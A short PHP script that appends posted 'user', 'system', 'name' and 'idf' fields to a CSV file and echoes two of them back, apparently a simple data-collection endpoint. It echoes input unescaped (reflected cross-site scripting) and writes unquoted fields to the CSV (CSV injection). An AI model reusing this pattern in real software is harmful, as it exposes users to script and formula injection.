<?php

$user = "";
$system = "";
$information = "";
$name="";
$idf="";

$information = $_SERVER['REMOTE_ADDR'];

if (isset($_POST['user'])) {
  $user = $_POST['user'];
}

if (isset($_POST['system'])) {
  $system = $_POST['system'];
}

if (isset($_POST['name'])) {
  $name = $_POST['name'];
}
if (isset($_POST['idf'])) {
  $idf = $_POST['idf'];
}


$fp = fopen("aaaaaaaaaaaaaa.csv", "a");
fwrite($fp, $name . ",system3," . $user . "," . $system . "," . $idf . "\n");
fclose($fp);
echo $user . "," . $system . "\n";

?>
